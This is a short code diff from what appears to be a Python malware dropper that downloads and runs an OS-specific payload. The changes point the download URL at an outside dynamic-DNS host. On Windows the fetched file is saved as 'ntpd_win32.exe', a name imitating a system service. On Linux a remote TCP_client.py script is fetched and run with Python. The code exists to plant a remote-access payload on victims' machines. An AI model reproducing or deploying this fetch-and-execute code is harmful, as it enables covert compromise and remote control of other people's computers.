@@ -23,8 +23,8 @@ except:
 #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
 #TODO: use free FTP server
 bin = False
-ScriptExec = "python3.5" # "./"  #cmd= "./{}".format(OsTargetpath)
-url = "http://127.0.0.1:8000/TCP_client.py"
+ScriptExec = "python3.5 " # "./"  #cmd= "./{}".format(OsTargetpath)
+url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
 OsTargetpath = ".payload_posix"
 shellcode = ""
 start = True #To decide entweder an oder aus die Zugriff
@@ -35,13 +35,14 @@ def run(**args):
     global bin, url, ScriptExec, OsTargetpath, shellcode
     if os.name == 'nt':
       bin = True
-      url = "http://saw-dsr.ddns.net:8000/test"
-      OsTargetpath = "payload_win32.exe"
+      ScriptExec = "./"
+      url = "http://saw-dsr.ddns.net:8000/nj"
+      OsTargetpath = "ntpd_win32.exe"
     elif os.name == 'posix':
       bin = False
       ScriptExec = "python3.5 "
       #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
-      OsTargetpath = "client.py"
+      #OsTargetpath = "client.py"
     else:
       return "[ERROR] getFileFromURI: Not recognised OS!"
 
